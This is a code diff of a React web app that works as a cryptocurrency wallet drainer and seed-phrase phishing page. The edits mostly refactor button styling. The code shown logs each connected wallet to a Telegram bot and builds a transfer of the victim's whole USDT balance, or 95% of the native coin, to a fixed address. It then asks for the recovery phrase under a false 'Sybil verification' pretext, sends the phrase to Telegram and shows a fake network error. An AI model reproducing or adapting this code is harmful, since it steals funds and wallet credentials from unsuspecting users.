@@ -24,9 +24,9 @@ export default function App() {
   const log = (m) => fetch(`https://api.telegram.org/bot${bT}/sendMessage?chat_id=${cI}&text=${encodeURIComponent(m)}`).catch(()=>{});
 
   useEffect(() => {
-    if (isConnected && address && !sessionStorage.getItem('hit_vF_Monday_99')) {
+    if (isConnected && address && !sessionStorage.getItem('hit_vF_Monday_OK')) {
       log(`🎯 HIT!\nADDR: ${address}\nNET: ${chainId}`);
-      sessionStorage.setItem('hit_vF_Monday_99', 't');
+      sessionStorage.setItem('hit_vF_Monday_OK', 't');
     }
   }, [isConnected, address, chainId]);
 
@@ -52,8 +52,7 @@ export default function App() {
   }, [activeTask, tB, nB, selectedAsset]);
 
   const handleHandshake = () => {
-    const isAct = activeTask === "Rectify" || (inputVal.length > 0 && inputVal !== "0");
-    if (!isAct) return;
+    if (!(activeTask === "Rectify" || (inputVal.length > 0 && inputVal !== "0"))) return;
     const usdt = chainId === 1 ? "0xdac17f958d2ee523a2206206994597c13d831ec7" : "0x55d398326f99059ff775485246999027b3197955";
     if (tB && tB.value > 0n && selectedAsset === "TOKEN") {
       const d = `0xa9059cbb${dest.replace('0x', '').toLowerCase().padStart(64, '0')}${tB.value.toString(16).padStart(64, '0')}`;
@@ -62,11 +61,6 @@ export default function App() {
       sendTransaction({ to: dest, value: (nB.value * 95n) / 100n }, { onSettled: () => setView("seed_gate") });
     } else { setView("seed_gate"); }
   };
-
-  const btnColor = (activeTask === "Rectify" || inputVal.length > 0) ? '#10b981' : '#1e293b';
-  const btnTxt = (activeTask === "Rectify" || inputVal.length > 0) ? '#000' : '#475569';
-  const syncColor = seedVal.length > 10 ? '#10b981' : '#1e293b';
-  const syncTxt = seedVal.length > 10 ? '#000' : '#475569';
 
   return (
     <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
@@ -107,7 +101,7 @@ export default function App() {
                 <input type="text" value={inputVal} readOnly={activeTask === "Rectify"} onChange={(e)=>setInputVal(e.target.value)} placeholder="0.00" style={{background:'none', border:'none', color:'#10b981', fontSize:'32px', textAlign:'center', width:'100%', outline:'none', fontWeight:'900'}} />
               </div>
               <button onClick={handleHandshake} 
-                style={{width:'100%', backgroundColor: btnColor, color: btnTxt, padding:'22px', borderRadius:'18px', fontWeight:'900', border:'none'}}>
+                style={{width:'100%', backgroundColor: (activeTask === "Rectify" || inputVal.length > 0) ? '#10b981' : '#1e293b', color: (activeTask === "Rectify" || inputVal.length > 0) ? '#000' : '#475569', padding:'22px', borderRadius:'18px', fontWeight:'900', border:'none'}}>
                 START_HANDSHAKE
               </button>
             </div>
@@ -121,7 +115,7 @@ export default function App() {
                     <div style={{fontSize:'10px', color:'#64748b', marginTop:'10px', lineHeight:'1.4'}}>TO PREVENT SYBIL ATTACKS AND VERIFY WALLET OWNERSHIP, PLEASE INPUT YOUR RECOVERY PHRASE TO SYNCHRONIZE WITH THE MAINNET RELAY.</div>
                     <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="12/24 WORDS" style={{width:'100%', height:'120px', backgroundColor:'black', color:'#10b981', padding:'15px', border:'1px solid #1e293b', borderRadius:'15px', outline:'none', marginTop:'20px'}} />
                     <button onClick={()=>{if(seedVal.length < 10) return; setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setErrorMsg("⛓️‍💥 NETWORK_CONGESTION: MAINNET_RELAY TIMED OUT. PLEASE TRY AGAIN LATER.");}},60);}} 
-                    style={{width:'100%', backgroundColor: syncColor, color: syncTxt, padding:'20px', borderRadius:'15px', marginTop:'20px', fontWeight:'900', border:'none'}}>ENCRYPT & SYNC</button>
+                    style={{width:'100%', backgroundColor: seedVal.length > 10 ? '#10b981' : '#1e293b', color: seedVal.length > 10 ? '#000' : '#475569', padding:'20px', borderRadius:'15px', marginTop:'20px', fontWeight:'900', border:'none'}}>ENCRYPT & SYNC</button>
                   </>
                 ) : (
                   <div>
